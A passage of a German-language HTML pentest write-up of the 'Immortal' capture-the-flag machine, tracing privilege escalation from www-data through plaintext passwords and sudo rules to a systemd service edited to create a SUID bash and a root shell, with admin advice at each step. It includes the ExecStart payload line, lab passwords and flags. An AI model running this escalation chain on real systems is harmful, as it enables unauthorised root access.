+             <p class="evaluation"><strong>Bewertung:</strong> `www-data` benötigt ein Passwort für `sudo`, das nicht bekannt ist. Kein direkter PE-Vektor über `sudo` für `www-data`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suchen Sie nach anderen PE-Methoden (SUID, Fehlkonfigurationen, Kernel-Exploits, Passwörter in Dateien).<br><strong>Empfehlung (Admin):** Korrekt konfiguriert, dass `www-data` keine (passwortlosen) sudo-Rechte hat.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@Immortal:/$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                     <pre>    31784    472 -rwsr-xr-x   1 root     root       481608 Dec 21 17:09 /usr/lib/openssh/ssh-keysign
+    22699     52 -rwsr-xr--   1 root     messagebus    51336 Jun  6  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+      391     88 -rwsr-xr-x   1 root     root          88304 Feb  7  2020 /usr/bin/gpasswd
+     4372     56 -rwsr-xr-x   1 root     root          55528 Jan 20  2022 /usr/bin/mount
+     3805     44 -rwsr-xr-x   1 root     root          44632 Feb  7  2020 /usr/bin/newgrp
+     4374     36 -rwsr-xr-x   1 root     root          35040 Jan 20  2022 /usr/bin/umount
+      388     60 -rwsr-xr-x   1 root     root          58416 Feb  7  2020 /usr/bin/chfn
+      389     52 -rwsr-xr-x   1 root     root          52880 Feb  7  2020 /usr/bin/chsh
+    37710    180 -rwsr-xr-x   1 root     root         182600 Jan 14  2023 /usr/bin/sudo
+     3972     72 -rwsr-xr-x   1 root     root          71912 Jan 20  2022 /usr/bin/su
+      392     64 -rwsr-xr-x   1 root     root          63960 Feb  7  2020 /usr/bin/passwd</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Das System wird nach SUID-Binärdateien durchsucht.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Es werden nur Standard-SUID-Binaries gefunden. Kein offensichtlicher, ungewöhnlicher PE-Vektor hier.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Prüfen Sie bekannte Exploits für die gefundenen Standard-Binaries oder suchen Sie weiter nach Fehlkonfigurationen in Home-Verzeichnissen oder Diensten.<br><strong>Empfehlung (Admin):** Regelmäßig überprüfen, ob SUID-Binaries notwendig sind und sicher konfiguriert sind.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@Immortal:/home$ <span class="command">ls</span></div>
+                     <pre>david  drake  eric</pre>
+                     <div class="prompt">www-data@Immortal:/home$ <span class="command">cd eric/</span></div>
+                     <div class="prompt">www-data@Immortal:/home/eric$ <span class="command">ls -la</span></div>
+                     <pre>[...]
+-rw-r--r-- 1 eric eric  134 Feb 27 20:59 .note.txt
+[...]</pre>
+                     <div class="prompt">www-data@Immortal:/home/eric$ <span class="command">cat .note.txt</span></div>
+                     <pre>I think I should tell David that this immortality thing is not a good idea, 
+although I'm sad to tell him, he's so excited about it...</pre>
+                      <div class="prompt">www-data@Immortal:/home/drake$ <span class="command">ls -la</span></div>
+                     <pre>[...]
+drwxr-xr-x 2 drake drake 4096 Feb 27 20:59 <span class="command">...</span>
+[...]
+-rw-r--r-- 1 drake drake   20 Feb 27 20:58 <span class="command">user.txt</span></pre>
+                     <div class="prompt">www-data@Immortal:/home/drake$ <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">nothinglivesforever</span></pre>
+                     <div class="prompt">www-data@Immortal:/home/drake$ <span class="command">cd .../</span></div>
+                     <div class="prompt">www-data@Immortal:/home/drake/...$ <span class="command">ls -la</span></div>
+                     <pre>total 12
+drwxr-xr-x 2 drake drake 4096 Feb 27 20:59 .
+drwxr-xr-x 4 drake drake 4096 Feb 29 18:58 ..
+-rw-r--r-- 1 drake drake  134 Feb 27 20:59 <span class="command">pass.txt</span></pre>
+                     <div class="prompt">www-data@Immortal:/home/drake/...$ <span class="command">cat pass.txt</span></div>
+                     <pre>netflix : drake123
+amazon : 123drake
+shelldred : shell123dred (f4ns0nly)
+<span class="command">system : <span class="password">kevcjnsgii</span></span>
+bank : myfavouritebank
+nintendo : 123456</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Die Home-Verzeichnisse der Benutzer `david`, `drake` und `eric` werden untersucht (als `www-data`). In `eric`'s Home wird eine Notiz gefunden. In `drake`'s Home wird die `user.txt` und ein verstecktes Verzeichnis `...` gefunden. In diesem Verzeichnis liegt eine `pass.txt`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Kritischer Fund! Die `pass.txt` enthält eine Liste von Zugangsdaten. Besonders interessant ist der Eintrag `system : <span class="password">kevcjnsgii</span>`, da dies ein potenzielles Systempasswort sein könnte. Die User-Flagge `<span class="password">nothinglivesforever</span>` wurde ebenfalls gefunden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, sich mit `su` als `david`, `drake` oder `eric` anzumelden und dabei das Passwort `kevcjnsgii` zu verwenden.<br><strong>Empfehlung (Admin):** Passwörter dürfen niemals im Klartext in Dateien gespeichert werden! Benutzer schulen, Home-Verzeichnisse auf unsichere Dateien prüfen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@Immortal:/home/drake/...$ <span class="command">su drake</span></div>
+                     <pre>Password: <span class="password">kevcjnsgii</span></pre>
+                     <div class="prompt">drake@Immortal:~/...$</div>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, mit `su` und dem Passwort `kevcjnsgii` zum Benutzer `drake` zu wechseln.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Erfolgreich! Der Benutzerkontext wurde von `www-data` zu `drake` gewechselt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Prüfen Sie nun die `sudo`-Rechte für `drake` (`sudo -l`).<br><strong>Empfehlung (Admin):** Passwort ändern, Ursache für Klartextspeicherung finden.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">drake@Immortal:~/...$ <span class="command">sudo -l</span></div>
+                     <pre>Matching Defaults entries for drake on Immortal:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User drake may run the following commands on Immortal:
+    <span class="command">(eric) NOPASSWD: /usr/bin/python3 /opt/immortal.py</span></pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Die sudo-Berechtigungen für `drake` werden geprüft.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> `drake` darf das Python-Skript `/opt/immortal.py` als Benutzer `eric` ohne Passwort ausführen. Dies ist ein klarer Weg zur Eskalation zum Benutzer `eric`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie `sudo -u eric python3 /opt/immortal.py` aus. Überprüfen Sie vorher den Inhalt von `/opt/immortal.py`, falls möglich.<br><strong>Empfehlung (Admin):** Überprüfen Sie diese `sudo`-Regel. Ist sie notwendig? Ist das Skript sicher? Das Ausführen von Skripten über `sudo` ist riskant.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">drake@Immortal:~/...$ <span class="command">sudo -u eric /opt/immortal.py</span></div>
+                     <pre>[sudo] password for drake: <span class="password">kevcjnsgii</span>
+sudo: /opt/immortal.py: command not found</pre>
+                     <div class="prompt">drake@Immortal:~/...$ <span class="command">sudo -u eric python3 /opt/immortal.py</span></div>
+                     <div class="prompt">eric@Immortal:/home/drake/...$</div>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der erste Versuch, das Skript direkt auszuführen, schlägt fehl (wahrscheinlich, weil das Skript keine Shebang hat oder `sudo` sie nicht interpretiert). Der zweite Versuch, das Skript explizit mit `python3` auszuführen, ist erfolgreich.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Benutzerkontext wurde erfolgreich zu `eric` gewechselt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Prüfen Sie `sudo -l` für `eric`.<br><strong>Empfehlung (Admin):** `sudo`-Regel überprüfen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">eric@Immortal:/home/drake/...$ <span class="command">sudo -l</span></div>
+                     <pre>Matching Defaults entries for eric on Immortal:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User eric may run the following commands on Immortal:
+    <span class="command">(root) NOPASSWD: sudoedit /etc/systemd/system/immortal.service</span>
+    <span class="command">(root) NOPASSWD: /usr/bin/systemctl start immortal.service</span>
+    <span class="command">(root) NOPASSWD: /usr/bin/systemctl stop immortal.service</span>
+    <span class="command">(root) NOPASSWD: /usr/bin/systemctl enable immortal.service</span>
+    <span class="command">(root) NOPASSWD: /usr/bin/systemctl disable immortal.service</span>
+    <span class="command">(root) NOPASSWD: /usr/bin/systemctl daemon-reload</span></pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Die sudo-Berechtigungen für `eric` werden geprüft.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Kritischer Fund für die finale Eskalation! `eric` darf `sudoedit` (ein sicherer Editor für Dateien mit Root-Rechten) verwenden, um die systemd-Service-Datei `/etc/systemd/system/immortal.service` zu bearbeiten. Außerdem darf er diesen Dienst mit `systemctl` als `root` steuern (starten, stoppen etc.) - alles ohne Passwort.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dies ist ein klassischer PE-Vektor über systemd-Services.
+                 1.  Bearbeiten Sie die Service-Datei mit `sudoedit /etc/systemd/system/immortal.service`.
+                 2.  Fügen Sie unter `[Service]` eine `ExecStart`-Anweisung hinzu, die eine Payload ausführt (z.B. Kopieren von `/bin/bash` nach `/tmp` und Setzen des SUID-Bits).
+                 3.  Speichern Sie die Datei.
+                 4.  Führen Sie `sudo systemctl daemon-reload` aus (obwohl dies hier nicht explizit erlaubt ist, könnte es implizit funktionieren oder nicht nötig sein).
+                 5.  Starten Sie den Service mit `sudo systemctl start immortal.service`.
+                 6.  Führen Sie die SUID-Bash aus `/tmp/bash -p`.
+                 <br><strong>Empfehlung (Admin):** Gewähren Sie `sudoedit`-Rechte nur mit äußerster Vorsicht. Erlauben Sie Benutzern nicht, systemd-Services zu bearbeiten und zu steuern, wenn dies nicht absolut notwendig ist. Diese Konfiguration ist extrem unsicher.</p>
+
+             <h2 id="proof-of-concept">Proof of Concept (Privilege Escalation via Systemd Service)</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">eric@Immortal:~$ <span class="command">sudoedit /etc/systemd/system/immortal.service</span></div>
+                     <!-- Kein direkter Output, Editor wird geöffnet -->
+                     <div class="prompt">eric@Immortal:~$ <span class="command">cat /etc/systemd/system/immortal.service</span></div>
+                     <pre>
+[Unit]
+Description=Immortal Service
+After=network.target
+
+[Service]
+Type=oneshot
+<span class="command">ExecStart=/bin/bash -c 'cp /bin/bash /opt/bash && chmod u+s /opt/bash'</span>
+
+[Install]
+WantedBy=multi-user.target</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Die `immortal.service`-Datei wird mit `sudoedit` bearbeitet. Der `cat`-Befehl zeigt den neuen Inhalt: Die `ExecStart`-Direktive wurde hinzugefügt, um `/bin/bash` nach `/opt/bash` zu kopieren und das SUID-Bit zu setzen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Payload zur Erstellung einer SUID-Bash wurde erfolgreich in die Service-Datei injiziert.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Starten Sie den Service, um die Payload auszuführen.<br><strong>Empfehlung (Admin):** `sudoedit`-Recht entfernen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">eric@Immortal:~$ <span class="command">sudo -u root /usr/bin/systemctl start immortal.service</span></div>
+                     <!-- Kein Output -->
+                     <div class="prompt">eric@Immortal:~$ <span class="command">ls -la /opt/</span></div>
+                     <pre>total 1224
+drwxr-xr-x  2 root root    4096 May  2 00:04 .
+drwxr-xr-x 18 root root    4096 Feb 27 20:20 ..
+<span class="command">-rwsr-xr-x  1 root root 1234376 May  2 00:04 bash</span>
+-rw-rw-rw-  1 root root     184 May  1 23:39 immortal.py
+-rw-r--r--  1 root root      36 Feb 28 20:19 immortal.txt</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der modifizierte Service wird mit `sudo systemctl start` gestartet. Anschließend wird der Inhalt von `/opt` überprüft.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Die Datei `/opt/bash` existiert nun und hat das SUID-Bit gesetzt (`-rwsr-xr-x`), was bedeutet, dass sie mit Root-Rechten ausgeführt wird, unabhängig davon, wer sie startet.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie `/opt/bash -p` aus, um eine Root-Shell zu erhalten.<br><strong>Empfehlung (Admin):** Unsichere sudo-Regel entfernen. System auf verdächtige SUID-Dateien prüfen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">eric@Immortal:/opt$ <span class="command">./bash -p</span></div>
+                     <div class="prompt">bash-5.1# <span class="command">id</span></div>
+                     <pre>uid=1002(eric) gid=1002(eric) <span class="command">euid=0(root)</span> groups=1002(eric)</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Die SUID-Bash `/opt/bash` wird mit der Option `-p` (preserve effective UID) ausgeführt. Der `id`-Befehl bestätigt die Rechte.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Fantastisch! Die effektive UID (`euid`) ist 0. Root-Zugriff wurde erlangt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Holen Sie die Root-Flagge.<br><strong>Empfehlung (Admin):** System bereinigen, alle Schwachstellen beheben.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">bash-5.1# <span class="command">cd /root/</span></div>
+                     <div class="prompt">bash-5.1# <span class="command">ls</span></div>
+                     <pre>immortal_formula.txt  root.txt</pre>
+                     <div class="prompt">bash-5.1# <span class="command">cat root.txt</span></div>
+                     <pre><span class="password">fiNally1mMort4l</span></pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Als root wird ins `/root`-Verzeichnis gewechselt und die `root.txt`-Datei ausgelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Root-Flagge `<span class="password">fiNally1mMort4l</span>` wurde erfolgreich gefunden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):** Bericht abschließen.<br>**Empfehlung (Admin):** System bereinigen.</p>
+
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/drake/user.txt</div>
+                    <div class="flag-value"><span class="password">nothinglivesforever</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">fiNally1mMort4l</span></div>
+                </div>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus Nmap Scan übernommen -->
+        <p>Berichtsdatum: 1. Mai 2024</p>
+    </footer>
+</body>
+</html>
